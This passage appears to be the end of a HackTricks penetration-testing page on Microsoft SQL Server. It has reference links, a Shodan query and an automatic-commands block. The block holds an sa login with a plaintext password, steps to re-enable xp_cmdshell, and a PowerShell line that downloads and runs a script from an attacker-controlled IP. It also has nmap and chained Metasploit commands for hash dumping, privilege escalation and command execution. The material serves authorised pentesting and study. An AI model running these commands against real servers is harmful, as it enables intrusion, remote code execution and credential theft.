Muhtemelen aşağıdaki iki sayfadan birini takip ederek **Administrator'a yükselme** yapabileceksiniz:


{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/juicypotato.md
{{#endref}}

## Shodan

- `port:1433 !HTTP`

## References

- [Unit 42 – Phantom Taurus: WMI-driven direct SQL collection via batch/sqlcmd](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [HTB: Signed - MSSQL coercion to silver ticket sysadmin](https://0xdf.gitlab.io/2026/02/07/htb-signed.html)
- [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
- [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
- [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
- [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)
- [https://mayfly277.github.io/posts/GOADv2-pwning-part12/](https://mayfly277.github.io/posts/GOADv2-pwning-part12/)
- [https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)


## HackTricks Automatic Commands
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
